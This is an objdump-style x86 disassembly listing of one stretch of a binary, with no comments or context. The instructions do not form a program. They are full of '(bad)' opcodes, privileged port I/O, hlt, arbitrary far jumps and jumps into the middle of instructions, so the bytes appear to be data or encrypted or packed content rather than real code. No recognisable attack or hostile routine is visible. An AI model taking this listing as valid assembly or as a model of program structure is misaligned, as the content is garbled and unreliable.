  41377a:	xlat   BYTE PTR es:[ebx]
  41377c:	mov    DWORD PTR [ebx+0x36],edx
  41377f:	sbb    al,0x17
  413781:	loopne 0x4137cb
  413783:	addps  xmm5,XMMWORD PTR [esi]
  413786:	push   esp
  413787:	(bad)  
  413788:	and    eax,0x712ffc8b
  41378d:	loope  0x41378b
  41378f:	mov    esi,fs
  413791:	sbb    al,0x78
  413793:	loope  0x4137bc
  413795:	cwde   
  413796:	bound  ecx,QWORD PTR [edx+eax*2]
  413799:	jae    0x413744
  41379b:	dec    ebx
  41379c:	ja     0x413799
  41379e:	stos   DWORD PTR es:[edi],eax
  41379f:	or     al,BYTE PTR [edi+ebx*4+0x9]
  4137a3:	jno    0x4137b0
  4137a5:	mov    edi,0x5f298dd
  4137aa:	mov    bh,cl
  4137ac:	(bad)  
  4137ae:	or     esp,DWORD PTR [ecx+0x67061f0f]
  4137b4:	sbb    DWORD PTR [edi-0x7fc2b349],esi
  4137ba:	jl     0x4137a3
  4137bc:	into   
  4137bd:	mov    ds:0x541203df,al
  4137c2:	jl     0x413749
  4137c4:	fsub   QWORD PTR [eax+0x6e8c4860]
  4137ca:	sub    al,0x98
  4137cc:	imul   ebp,DWORD PTR [edi-0x47],0x4f89d697
  4137d3:	push   esp
  4137d4:	mov    edx,0xfaf3dd0b
  4137d9:	or     ecx,0x688f1858
  4137df:	ret    
  4137e0:	mov    cl,0x55
  4137e2:	xchg   BYTE PTR [ebx-0x3d890c8a],al
  4137e8:	jmp    0x4137d8
  4137ea:	lods   eax,DWORD PTR ds:[esi]
  4137eb:	out    0xad,eax
  4137ed:	xchg   esi,eax
  4137ee:	mov    dl,0x3d
  4137f0:	push   es
  4137f1:	ja     0x4137d6
  4137f3:	hlt    
  4137f4:	jo     0x4137d8
  4137f6:	xchg   edi,eax
  4137f7:	fstp   TBYTE PTR gs:[ecx-0xd723c06]
  4137fe:	ret    0x693a
  413801:	pop    edx
  413802:	outs   dx,BYTE PTR ds:[esi]
  413803:	out    0xc1,al
  413805:	xor    bl,dh
  413807:	popa   
  413808:	sar    DWORD PTR [ebp+0x7c],cl
  41380b:	retf   0x8e4c
  41380e:	mov    dl,0xe7
  413810:	fidiv  DWORD PTR [ecx+ebx*2-0x6b3015af]
  413817:	add    edx,ebx
  413819:	mov    dl,0xfa
  41381b:	xchg   esi,eax
  41381c:	mov    dl,0xdd
  41381e:	outs   dx,BYTE PTR ds:[esi]
  41381f:	lahf   
  413820:	and    bl,0x3c
  413823:	cmp    eax,0x2036ce99
  413828:	shr    BYTE PTR [esi-0xc],cl
  41382b:	sub    eax,0x5dbeb85a
  413830:	push   ss
  413831:	pop    esi
  413832:	fcom   QWORD PTR gs:[edx]
  413835:	jo     0x498afc39
  41383b:	inc    ebp
  41383c:	lds    esi,FWORD PTR [edi-0x572b2cba]
  413842:	xor    DWORD PTR [esp+ebp*4],0x4f8f8869
  413849:	push   esp
  41384a:	imul   edi,DWORD PTR [ecx],0x131e915e
  413850:	sub    ch,cl
  413852:	mov    al,0x90
  413854:	push   0x2e
  413856:	jg     0x413863
  413858:	pop    esi
  413859:	les    edi,FWORD PTR [edx]
  41385b:	stc    
  41385c:	repz xor BYTE PTR [ebp+0x3d],dh
  413860:	and    DWORD PTR [ecx+ebx*8+0x47f8c75],edi
  413867:	imul   edx,DWORD PTR [edi+0x7],0x1548cb4
  41386e:	sub    eax,0x7c6d9fa5
  413873:	and    ah,BYTE PTR [edx-0x1344216c]
  413879:	fdivrp st(4),st
  41387b:	out    0x72,al
  41387d:	inc    eax
  41387e:	xchg   DWORD PTR [ebx-0x31],ecx
  413881:	cdq    
  413882:	cmp    BYTE PTR [eax-0x63],al
  413885:	shl    ebx,1
  413887:	fwait
  413888:	cs out 0xd1,al
  41388b:	inc    edi
  41388c:	lock je 0x41387c
  41388f:	pop    esi
  413890:	jmp    0x1448:0x50bf94c1
  413897:	std    
  413898:	out    0x2a,al
  41389a:	(bad)  
  41389b:	jne    0x4138b8
  41389d:	xor    DWORD PTR [edi-0x4d7acfbc],ebx
  4138a3:	repnz mov eax,0xbf75154d
  4138a9:	jmp    0x4138d5
  4138ab:	mov    ?,esp
  4138ad:	test   eax,0xbb84e0d3
  4138b2:	int3   
  4138b3:	jmp    0x4138b4
  4138b5:	lahf   
  4138b6:	mov    al,0xc3
  4138b8:	repz aad 0xa2
  4138bb:	loopne 0x413887
  4138bd:	inc    eax
  4138be:	jmp    DWORD PTR [edx+0x1dc4efc8]
  4138c4:	sbb    bh,ch
  4138c6:	shl    dh,1
  4138c8:	mov    gs,WORD PTR [esi+0x14061fd6]
  4138ce:	xor    eax,DWORD PTR [ecx-0x32]
  4138d1:	arpl   WORD PTR [esi+0x42],bx
  4138d4:	addr16 pop ss
  4138d6:	fcom   QWORD PTR [eax+0x32]
  4138d9:	adc    bp,WORD PTR [edx-0x577a6fe3]
  4138e0:	daa    
  4138e1:	xor    dh,BYTE PTR [esi-0x50]
  4138e4:	sbb    eax,0x3b278295
  4138e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4138ea:	cmp    ebp,edi
  4138ec:	cld    
  4138ed:	cmp    al,0x70
  4138ef:	(bad)  
  4138f0:	push   edx
  4138f1:	loope  0x4138a5
  4138f3:	leave  
  4138f4:	aaa    
  4138f5:	scas   al,BYTE PTR es:[edi]
  4138f6:	pop    eax
  4138f7:	sub    ebx,ecx
  4138f9:	xor    BYTE PTR [ebx+eiz*1-0x70],dh
  4138fd:	xor    bl,0xc7
  413900:	add    ebx,esi
  413902:	mov    ds:0x4bfb5555,al
  413907:	add    dl,BYTE PTR ss:[ebx-0x244f5e]
  41390e:	movaps xmm3,XMMWORD PTR [esi+0x1d]
  413912:	add    ah,BYTE PTR [edi+ecx*8+0x18337b2c]
  413919:	push   eax
  41391a:	xchg   BYTE PTR [ebp+0x4adbf209],bl
  413920:	cmp    BYTE PTR [edi],ah
  413922:	repz ret 0x4366
  413926:	enter  0xeea2,0xb1
  41392a:	sbb    BYTE PTR [edi+0x5c1749d6],al
  413930:	dec    edi
  413931:	rcl    dh,1
  413933:	mov    eax,0xa64d8064
  413938:	int3   
  413939:	call   0x7e3300c5
  41393e:	add    DWORD PTR [ecx+0x32],ebp
  413941:	aaa    
  413942:	mov    WORD PTR [esi+0x5c1bc2ba],gs
  413948:	das    
  413949:	rol    edi,0x47
  41394c:	sub    al,0x8
  41394e:	sub    DWORD PTR gs:[ecx],0x353f23f6
  413955:	cmp    eax,ebp
  413957:	push   esi
  413958:	cli    
  413959:	mov    dh,0x68
  41395b:	push   esi
  41395c:	std    
  41395d:	xchg   edx,eax
  41395e:	js     0x413938
  413960:	jmp    0x44fe:0x24afb9f7
  413967:	stc    
  413968:	sbb    dl,BYTE PTR [ebp+ebp*4+0x77]
  41396c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41396d:	ds push edi
  41396f:	je     0x4139ec
  413971:	mov    ch,0xfc
  413973:	lea    edx,[ebp+0x368bac8b]
  413979:	out    0x84,al
  41397b:	sbb    al,0x5c
  41397e:	hlt    
  41397f:	adc    ebp,DWORD PTR [edi+0x1b]
  413982:	loope  0x4139d3
  413984:	xor    ah,BYTE PTR [edx]
  413986:	out    0x28,al
  413988:	(bad)  
  413989:	jns    0x413945
  41398b:	arpl   cx,sp
  41398d:	xchg   ebp,eax
  41398e:	and    al,BYTE PTR [ebx]
  413990:	popf   
  413991:	out    0x94,eax
  413993:	inc    eax
  413994:	fstp   DWORD PTR [esi+0x471a1533]
  41399a:	cmp    edi,esi
  41399c:	mov    BYTE PTR [edx+eiz*8-0x28fc578a],dl
  4139a3:	test   al,0x2c
  4139a5:	push   esp
  4139a6:	pusha  
  4139a7:	sbb    al,BYTE PTR [ebp+ecx*4-0x4c]
  4139ab:	outs   dx,BYTE PTR ds:[esi]
  4139ac:	add    ebp,ebp
  4139ae:	aam    0x10
  4139b0:	xlat   BYTE PTR ds:[ebx]
  4139b1:	and    al,BYTE PTR [ebx+0x3f]
  4139b4:	mov    al,ds:0x246f9094
  4139b9:	enter  0x20f8,0xb5
  4139bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4139be:	imul   edi,DWORD PTR [ebx],0xffffff8c
  4139c1:	sbb    dh,BYTE PTR [ebx+0x7]
  4139c4:	push   ebp
  4139c5:	jmp    FWORD PTR [edi]
  4139c7:	popf   
  4139c8:	dec    DWORD PTR [ebp+0x6e4a87d3]
  4139ce:	arpl   bp,cx
  4139d0:	imul   eax,DWORD PTR [edi-0x27b2288d],0x0
  4139d7:	call   0xc8bc0e62
  4139dc:	cdq    
  4139dd:	call   DWORD PTR [eax-0x78]
  4139e0:	dec    ecx
  4139e1:	sbb    eax,0x886d9e3c
  4139e6:	fwait
  4139e7:	xchg   ecx,eax
  4139e8:	sbb    al,0x4a
  4139ea:	out    dx,eax
  4139eb:	ret    0xa5e
  4139ee:	cmp    al,0xeb
  4139f0:	and    DWORD PTR [ebp+0x7e],0x2bbe0907
  4139f7:	and    al,0x69
  4139f9:	mov    esi,0x6e33e9d7
  4139fe:	idiv   DWORD PTR [eax+edx*2-0x39]
  413a02:	inc    ecx
  413a03:	ret    0xf291
  413a06:	cli    
  413a07:	lock pop eax
  413a09:	sub    bh,BYTE PTR [ebx]
  413a0b:	push   cs
  413a0c:	inc    edx
  413a0d:	jecxz  0x413a2a
  413a0f:	int3   
  413a10:	dec    esp
  413a11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413a12:	(bad)  
  413a14:	pop    esp
  413a15:	add    ebp,DWORD PTR [ebx-0x74c73d5e]
  413a1b:	mov    edx,0x67083397
  413a20:	(bad)  
  413a21:	call   0xa28582eb
  413a26:	push   edi
  413a27:	test   al,0x87
  413a29:	in     eax,0x2d
  413a2b:	mov    al,ds:0xf4222343
  413a30:	cmp    al,0x5
  413a32:	pushf  
  413a33:	enter  0xec82,0x8a
  413a37:	aam    0x35
  413a39:	xor    BYTE PTR [edx-0xa69017],cl
  413a3f:	or     edx,DWORD PTR [edi]
  413a41:	in     eax,dx
  413a42:	mov    edi,0xe7f854f
  413a47:	mov    BYTE PTR [edi-0x2a],bl
  413a4a:	retf   0xfd3e
  413a4d:	pop    edx
  413a4e:	mov    bl,0xca
  413a50:	mov    ecx,0xa7e35e89
  413a55:	mov    edi,0x926d67f4
  413a5a:	scas   al,BYTE PTR es:[edi]
  413a5b:	daa    
  413a5c:	fld    TBYTE PTR [bx+si-0x3e67]
  413a61:	cli    
  413a62:	inc    edi
  413a63:	mov    esi,0x3e159c0c
  413a68:	aaa    
  413a69:	adc    al,0xfc
  413a6b:	push   ds
  413a6c:	mov    esp,0x294b3a02
  413a71:	ds push ss
  413a73:	xchg   edi,eax
  413a74:	xor    edx,0xe5632802
  413a7a:	sti    
  413a7b:	popa   
  413a7c:	cmp    eax,0x23b6f4b2
  413a81:	dec    edi
  413a82:	sbb    esi,esp
  413a84:	rol    ecx,1
  413a86:	push   edx
  413a87:	loop   0x413a89
  413a89:	repnz sub cl,bl
  413a8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413a8d:	xor    cl,BYTE PTR [ecx-0x4c388001]
  413a93:	mov    bl,bh
  413a95:	sar    BYTE PTR [ebp+0x733a56b9],0xb0
  413a9c:	hlt    
  413a9d:	add    dl,ch
  413a9f:	sbb    DWORD PTR [ebp+edi*1+0x45ebc00c],ebp
  413aa6:	mov    esi,0xf4312a57
  413aab:	fist   DWORD PTR [eax+0x5427f154]
  413ab1:	mov    dl,0xc2
  413ab3:	test   eax,0x85a7d2a
  413ab8:	inc    edi
  413ab9:	out    0xcd,al
  413abb:	neg    dh
  413abd:	xchg   ecx,eax
  413abe:	lods   al,BYTE PTR ds:[esi]
  413abf:	repz add al,0x98
  413ac2:	sub    al,0xd6
  413ac4:	int    0x33
  413ac6:	cmp    DWORD PTR [edx-0x196d7129],edi
  413acc:	ror    DWORD PTR [ecx-0x72e3bf6b],1
  413ad2:	sub    BYTE PTR [ecx-0x3f1e4c38],0x9e
  413ad9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413ada:	mov    esp,0x805fa2fd
  413adf:	and    al,dh
  413ae1:	sub    bh,BYTE PTR [edx+0x379d4d2e]
  413ae7:	int3   
  413ae8:	mov    ebx,0x6cea71df
  413aed:	jl     0x413b0b
  413aef:	icebp  
  413af0:	(bad)  
  413af3:	rcr    DWORD PTR [esi-0x2f],0x71
  413af7:	push   ds
  413af8:	mov    esp,0x95afa4a7
  413afd:	jo     0x413ab6
  413aff:	and    esp,DWORD PTR [eax-0x4b]
  413b02:	or     al,0xb6
  413b04:	pop    ebx
  413b05:	pop    edi
  413b06:	jle    0x413a97
  413b08:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413b09:	leave  
  413b0a:	in     al,dx
  413b0b:	pop    ds
  413b0c:	add    eax,0xfc5f69ad
  413b11:	iret   
  413b12:	call   0xdb47317c
  413b17:	popa   
  413b18:	xchg   ebp,eax
  413b19:	cwde   
  413b1a:	or     bp,WORD PTR [edi+0x9]
  413b1e:	pop    edi
  413b1f:	cdq    
  413b20:	inc    edx
  413b21:	mov    ebp,0x8aa9dd1c
  413b26:	pop    es
  413b27:	adc    eax,0x77fe6b7a
  413b2c:	test   DWORD PTR [ecx+0x589614ee],eax
  413b32:	repnz xor DWORD PTR [edx+0x13],edx
  413b36:	pop    edx
  413b37:	mov    ds:0xe60b308a,eax
  413b3c:	fxch   st(0)
  413b3e:	push   edx
  413b3f:	or     edi,ebx
  413b41:	or     ebx,DWORD PTR [edx-0x74]
  413b44:	add    bh,BYTE PTR [edx+0x4f735bd3]
  413b4a:	popf   
  413b4b:	sub    al,0x7a
  413b4d:	cmp    al,0xb5
  413b4f:	xchg   ah,bl
  413b51:	jecxz  0x413b0a
  413b53:	sub    bl,BYTE PTR [esi+0x6a]
  413b56:	call   0x2c1f:0x1f0b870a
  413b5d:	in     al,dx
  413b5e:	dec    edx
  413b5f:	in     al,0xdf
  413b61:	sahf   
  413b62:	pop    ds
  413b63:	das    
  413b64:	les    edx,FWORD PTR [ecx]
  413b66:	es xchg bh,bl
  413b69:	cmp    bh,dh
  413b6b:	dec    eax
  413b6c:	fcomp  QWORD PTR [ebp+0x61c8677d]
  413b72:	and    dl,al
  413b74:	mov    ds:0xfb329626,al
  413b79:	dec    ebx
  413b7a:	push   0xffffffed
  413b7c:	fadd   QWORD PTR [ebx]
  413b7e:	(bad)  
  413b7f:	xchg   edi,eax
  413b80:	stos   BYTE PTR es:[edi],al
  413b81:	and    al,0xca
  413b83:	pop    esp
  413b84:	xchg   edx,eax
  413b85:	aaa    
  413b86:	cmp    dl,ah
  413b88:	add    eax,0x3368730a
  413b8d:	in     al,0xcc
  413b8f:	inc    ecx
  413b90:	sbb    al,0x87
  413b92:	mov    esi,0x8df05951
  413b97:	pushf  
  413b98:	imul   edi
  413b9a:	imul   esp,edi,0xffffff89
  413b9d:	shr    BYTE PTR [edx+eiz*4+0x37],1
  413ba1:	cmp    bh,BYTE PTR [ecx+0x2c]
  413ba4:	sub    al,0x74
  413ba6:	aam    0x2f
  413ba8:	addr16 int 0x8
  413bab:	enter  0x241c,0x68
  413baf:	ror    DWORD PTR [edx+0x2b],cl
  413bb2:	inc    eax
  413bb3:	dec    ebp
  413bb4:	jae    0x413ba4
  413bb6:	xchg   esp,eax
  413bb7:	dec    ebx
  413bb8:	sub    ebx,edi
  413bba:	mov    BYTE PTR fs:[ecx+ecx*1+0x2d],cl
  413bbf:	xchg   edi,eax
  413bc0:	mov    ds:0x750181ed,eax
  413bc5:	fwait
  413bc6:	ror    BYTE PTR [edx],cl
  413bc8:	inc    edi
  413bc9:	jge    0x413b82
  413bcb:	out    dx,al
  413bcc:	fsub   DWORD PTR [esi]
  413bce:	ins    DWORD PTR es:[edi],dx
  413bcf:	jae    0x413b70
  413bd1:	aas    
  413bd2:	sbb    BYTE PTR [ebx+eax*1-0x719dd22b],dh
  413bd9:	leave  
  413bda:	sbb    eax,0x296af6e7
  413bdf:	push   ss
  413be0:	pop    ebp
  413be1:	test   DWORD PTR [edx-0x7d41e1b2],ebp
  413be7:	dec    ecx
  413be8:	stc    
  413be9:	adc    al,0xc1
  413beb:	xor    al,0xa4
  413bed:	retf   0x5510
  413bf0:	(bad)  
  413bf1:	mov    ecx,0x95492d5f
  413bf6:	fsubr  st,st(6)
  413bf8:	jnp    0x413c4a
  413bfa:	jbe    0x413c4c
  413bfc:	dec    eax
  413bfd:	mov    ds:0x4b9b754d,al
  413c02:	cdq    
  413c03:	fisub  WORD PTR [esp+edi*2]
  413c06:	cdq    
  413c07:	(bad)  
  413c08:	cmp    ecx,DWORD PTR [ebx-0x124d0776]
  413c0e:	cmp    ecx,DWORD PTR [esi]
  413c10:	push   edi
  413c11:	loope  0x413c80
  413c13:	mov    edx,0x90c2611a
  413c18:	pop    esp
  413c19:	pop    es
  413c1a:	pop    ebp
  413c1b:	and    DWORD PTR [ebx*1+0x46c7b59e],edx
  413c22:	or     al,BYTE PTR [edi-0x47]
  413c25:	retf   0x31de
  413c28:	icebp  
  413c29:	mov    ch,0x3a
  413c2b:	mov    ebp,DWORD PTR [edi+0x740adfe3]
  413c31:	call   0x8bd7:0x160220e7
  413c38:	adc    ah,bh
  413c3a:	push   ss
  413c3b:	xchg   DWORD PTR [eax+0x10],edi
  413c3e:	push   ds
  413c3f:	push   ecx
  413c40:	dec    edx
  413c41:	mov    DWORD PTR [esi],esp
  413c43:	retf   0x25d7
  413c46:	pop    esi
  413c47:	jge    0x413ca5
  413c49:	retf   
  413c4a:	fidiv  DWORD PTR [ebx+0x5667b997]
  413c50:	push   0xfffffff0
  413c52:	scas   eax,DWORD PTR es:[edi]
  413c53:	add    al,0x38
  413c55:	cwde   
  413c56:	cdq    
  413c57:	dec    edi
  413c58:	(bad)  
  413c59:	jp     0x413bf3
  413c5b:	aas    
  413c5c:	sbb    BYTE PTR [esi+eiz*1],bl
  413c5f:	mov    ch,0xde
  413c61:	jne    0x413c8c
  413c63:	mov    edi,0x32e66661
  413c68:	mov    cl,0xff
  413c6a:	cmp    DWORD PTR [edx],eax
  413c6c:	mov    esi,0x4b01d8eb
  413c71:	mul    edi
  413c73:	nop
  413c74:	jle    0x413cbc
  413c76:	es popf 
  413c78:	loopne 0x413c66
  413c7a:	xchg   ebx,eax
  413c7b:	fcomip st,st(0)
  413c7d:	imul   ebx,DWORD PTR [ecx],0xffffff88
  413c80:	ror    DWORD PTR [eax+0x61ea6caf],cl
  413c86:	xor    eax,DWORD PTR [ebx+0x34]
  413c89:	daa    
  413c8a:	push   0xe
  413c8c:	std    
  413c8d:	inc    ebx
  413c8e:	out    dx,eax
  413c8f:	mov    al,ds:0x1ce49a2c
  413c94:	cdq    
  413c95:	jne    0x413c63
  413c97:	dec    esi
  413c98:	jns    0x413d0f
  413c9a:	sbb    ch,bh
  413c9c:	addr16 mov ds:0x1f77,al
  413ca0:	jnp    0x413ca1
  413ca2:	pop    esi
  413ca3:	mov    ds:0xf36a384f,al
  413ca8:	pop    esp
  413ca9:	mov    ah,0x22
  413cab:	sub    al,0xba
  413cad:	ins    BYTE PTR es:[edi],dx
  413cae:	cmp    bl,0x4b
  413cb1:	push   ds
  413cb2:	in     eax,0xe0
  413cb4:	rcr    BYTE PTR [ebp+0x523fdb16],0xa2
  413cbb:	jp     0x413d01
  413cbd:	and    edx,0xc7edbdd2
  413cc3:	ret    
  413cc4:	aam    0x5e
  413cc6:	xchg   esi,eax
  413cc7:	mov    ebp,0xbb644c6d
  413ccc:	adc    edx,DWORD PTR [ebx]
  413cce:	cmp    ebx,DWORD PTR ds:0xc7308967
  413cd4:	repz xchg ecx,eax
  413cd6:	add    DWORD PTR [eax+0x2d],ebx
  413cd9:	dec    edx
  413cda:	dec    edi
  413cdb:	xlat   BYTE PTR ds:[ebx]
  413cdc:	pop    ss
  413cdd:	pop    ebx
  413cde:	add    DWORD PTR [ecx-0x40604012],ebp
  413ce4:	cmp    DWORD PTR [eax-0x2454e12c],ebp
  413cea:	mov    al,0x45
  413cec:	loope  0x413d22
  413cee:	push   0xb1abe292
  413cf3:	inc    ebp
  413cf4:	stc    
  413cf5:	into   
  413cf6:	ins    DWORD PTR es:[edi],dx
  413cf7:	jmp    0x56689ab4
  413cfc:	and    BYTE PTR [ebx],0x60
  413cff:	arpl   dx,bp
  413d01:	xchg   ah,cl
  413d03:	data16 arpl WORD PTR [edi-0xf17478e],bp
  413d0a:	cld    
  413d0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413d0c:	imul   ecx,DWORD PTR ds:0x384ad55e,0xf6fdc8c
  413d16:	xchg   BYTE PTR [esi],cl
  413d18:	jae    0x413d70
  413d1a:	jmp    0x602b:0xa041df1f
  413d21:	push   esi
  413d22:	pop    ebp
  413d23:	mov    DWORD PTR [esi+0x569954df],esi
  413d29:	mov    dl,0xb0
  413d2b:	pop    ds
  413d2c:	push   ss
  413d2d:	jnp    0x413cfa
  413d2f:	outs   dx,DWORD PTR ds:[esi]
  413d30:	shl    BYTE PTR [esi+0x43],0x16
  413d34:	ret    0xd254
  413d37:	shl    DWORD PTR [edx+ebx*8-0x16],0x3f
  413d3c:	sub    cl,BYTE PTR [edx-0x44c21e4c]
  413d42:	stos   BYTE PTR es:[edi],al
  413d43:	push   edi
  413d44:	mov    dh,0x18
  413d46:	add    esi,ebp
  413d48:	jmp    0x413ce9
  413d4a:	out    dx,al
  413d4b:	mov    cl,0x25
  413d4d:	arpl   WORD PTR [edx],si
  413d4f:	cmc    
  413d50:	inc    edi
  413d51:	push   edi
  413d52:	fwait
  413d53:	jnp    0x413cf3
  413d55:	pushf  
  413d56:	inc    edx
  413d57:	push   es
  413d58:	jne    0x413d2e
  413d5a:	fwait
  413d5b:	jnp    0x413d61
  413d5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413d5e:	mov    esi,0xa68e8a3
  413d63:	xor    eax,0x25b49260
  413d68:	mov    edx,0x78ad0b5f
  413d6d:	popa   
  413d6e:	adc    DWORD PTR [ecx*8+0x3127600f],edi
  413d75:	jmp    0x862:0x9da961a1
  413d7c:	int    0xba
  413d7e:	outs   dx,DWORD PTR ds:[esi]
  413d7f:	mov    dl,0x21
  413d81:	sbb    DWORD PTR [eax-0x73],eax
  413d84:	xchg   edi,eax
  413d85:	lahf   
  413d86:	stos   DWORD PTR es:[edi],eax
  413d87:	rcr    DWORD PTR [ecx+0x26],1
  413d8a:	jb     0x413dd5
  413d8c:	adc    al,0x82
  413d8e:	loopne 0x413d5a
  413d90:	adc    edi,eax
  413d92:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413d93:	pop    edi
  413d94:	push   ss
  413d95:	repnz mov bl,0xce
  413d98:	imul   ebp,edx,0x382f1b91
  413d9e:	inc    ebp
  413d9f:	jge    0x413d4a
  413da1:	pop    edi
  413da2:	mov    al,0x56
  413da4:	mov    eax,ds:0xfe616463
  413da9:	add    al,0xc2
  413dab:	aas    
  413dac:	add    BYTE PTR [ebx],dh
  413dae:	mov    dh,0x2e
  413db0:	sbb    BYTE PTR ds:0xb2cbf9c9,al
  413db6:	dec    ecx
  413db7:	or     dh,bh
  413db9:	ret    0xedd8
  413dbc:	js     0x413da6
  413dbe:	mov    ah,0x3c
  413dc0:	loop   0x413d53
  413dc2:	sbb    BYTE PTR [edi-0x1d84939a],dl
  413dc8:	sub    DWORD PTR [eax],esi
  413dca:	jmp    0xc0f6:0x8d1204b5
  413dd1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413dd2:	or     BYTE PTR [ecx],0x67
  413dd5:	mov    al,0x86
  413dd7:	and    al,0x29
  413dd9:	or     al,0xa8
  413ddb:	mov    ecx,0x45842144
  413de0:	mov    ecx,0xb337b30
  413de5:	xchg   esi,eax
  413de6:	ja     0x413e2c
  413de8:	call   0xbdb8d106
  413ded:	outs   dx,DWORD PTR ds:[esi]
  413dee:	int    0xda
  413df0:	dec    esi
  413df1:	dec    eax
  413df2:	fistp  WORD PTR [edi-0x569f4d15]
  413df8:	mov    bh,0xb
  413dfa:	fistp  DWORD PTR [edi]
  413dfc:	pusha  
  413dfd:	out    dx,al
  413dfe:	scas   eax,DWORD PTR es:[edi]
  413dff:	mov    WORD PTR [ebx-0x37a55a46],?
  413e05:	xor    esi,DWORD PTR [edi+0x5c]
  413e08:	jecxz  0x413e30
  413e0a:	mov    ebx,0x2a80343d
  413e0f:	add    DWORD PTR [ebp+0x63],ebp
  413e12:	daa    
  413e13:	aad    0xc0
  413e15:	int    0xd8
  413e17:	int    0x9b
  413e19:	std    
  413e1a:	and    al,0xa3
  413e1c:	inc    esp
  413e1d:	cwde   
  413e1e:	push   ecx
  413e1f:	xor    al,0xd5
  413e21:	lea    eax,[ebx]
  413e23:	jmp    0xe08ed2fe
  413e28:	lds    edx,FWORD PTR [ebx+0x95caf84]
  413e2e:	js     0x413dd1
  413e30:	xor    edx,DWORD PTR [edi-0x38]
  413e33:	popf   
  413e34:	out    dx,eax
  413e35:	shr    DWORD PTR [esi+0x6f],cl
  413e38:	shl    BYTE PTR [ecx+ebx*1-0x73],0x19
  413e3d:	pusha  
  413e3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413e3f:	popa   
  413e40:	lea    esi,[esi]
  413e42:	mov    al,0x27
  413e44:	das    
  413e45:	sti    
  413e46:	pop    DWORD PTR [edx]
  413e48:	push   edi
  413e49:	pop    ebx
  413e4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413e4b:	push   esi
  413e4c:	into   
  413e4d:	and    al,0x5d
  413e4f:	mov    al,ds:0xe2b97d59
  413e54:	or     BYTE PTR [eax],al
  413e56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413e57:	enter  0x7484,0x17
  413e5b:	jae    0x413dee
  413e5d:	addr16 dec ecx
  413e5f:	aaa    
  413e60:	aam    0x75
  413e62:	and    BYTE PTR [edi+edx*1+0x1e],ch
  413e66:	sar    DWORD PTR [ebx-0x54cf44cf],1
  413e6c:	cld    
  413e6d:	mov    ebx,0x34458ae3
  413e72:	pop    ebx
  413e73:	dec    ebp
  413e74:	and    eax,0xe80b7e9a
  413e79:	test   DWORD PTR [ecx-0x7fcb143a],0xa69646d1
  413e83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413e84:	push   ebp
  413e85:	jge    0x413efd
  413e87:	imul   esp,DWORD PTR [eax+edx*2+0x50],0x1ac69ccc
  413e8f:	add    ebx,ebx
  413e91:	cmp    BYTE PTR ds:0x98a9f9c3,bh
  413e97:	and    edi,DWORD PTR [edx+ebx*2]
  413e9a:	in     al,0x5a
  413e9c:	mov    ch,0xad
  413e9e:	jecxz  0x413f00
  413ea0:	jne    0x413eab
  413ea2:	or     esi,ebx
  413ea4:	test   DWORD PTR [eax+edx*1-0x7c8aa9e7],esp
  413eab:	retf   
  413eac:	rdpmc  
  413eae:	adc    ch,cl
  413eb0:	mov    ch,BYTE PTR [esi-0x73174c49]
  413eb6:	int    0xdd
  413eb8:	and    eax,0x73f5d908
  413ebd:	add    esp,DWORD PTR [edi-0x6b44dfcf]
  413ec3:	outs   dx,DWORD PTR ds:[esi]
  413ec4:	test   al,0x6
  413ec6:	jns    0x413ee7
  413ec8:	ds cmp eax,0x38d589f8
  413ece:	outs   dx,BYTE PTR ds:[esi]
  413ecf:	pop    edi
  413ed0:	scas   al,BYTE PTR es:[edi]
  413ed1:	push   edi
  413ed2:	cwde   
  413ed3:	push   cs
  413ed4:	inc    ebx
  413ed5:	add    eax,0xe6197346
  413eda:	sub    DWORD PTR [ebx],edi
  413edc:	ret    0x4ad
  413edf:	leave  
  413ee0:	retf   
  413ee1:	dec    esi
  413ee2:	ret    0x6b1f
  413ee5:	push   es
  413ee6:	xchg   edi,eax
  413ee7:	mov    ebx,0x921787aa
  413eec:	sbb    bl,al
  413eee:	mov    bl,0xb9
  413ef0:	imul   ebp,DWORD PTR [ebp+0x21bdc11f],0x9f4a8131
  413efa:	repnz mov ebp,0xc6ae6fea
  413f00:	mov    bl,0x63
  413f02:	push   ebp
  413f03:	and    esi,edx
  413f05:	mov    BYTE PTR [edi],dh
  413f07:	fidivr DWORD PTR [ecx-0x5d859ffc]
  413f0d:	sbb    al,0x40
  413f0f:	call   0xe4b32ab8
  413f14:	stos   DWORD PTR es:[edi],eax
  413f15:	adc    al,0xda
  413f17:	stc    
  413f18:	jecxz  0x413f42
  413f1a:	cmc    
  413f1b:	sub    ecx,ecx
  413f1d:	mov    ds:0xa878c92f,al
  413f22:	add    al,0x5
  413f24:	ds and ebp,0xffffff93
  413f28:	xor    eax,0xbd936809
  413f2d:	or     ebp,DWORD PTR [eax]
  413f2f:	cdq    
  413f30:	xor    ch,bl
  413f32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413f33:	gs jmp 0x88ab9732
  413f39:	pop    ss
  413f3a:	outs   dx,DWORD PTR ds:[esi]
  413f3b:	fwait
  413f3c:	ret    0xb05b
  413f3f:	mov    dh,BYTE PTR [edx+ebx*1-0x10]
  413f43:	jb     0x413f73
  413f45:	adc    al,0xd3
  413f47:	(bad)  
  413f48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f49:	repnz mov dl,0xd
  413f4c:	mov    ebx,0xf9a2a3bb
  413f51:	jmp    0xdcb478b9
  413f56:	imul   edx,DWORD PTR [ecx-0x4ff7c5c1],0xbc6e495f
  413f60:	dec    esp
  413f61:	xor    ebx,DWORD PTR [ecx]
  413f63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
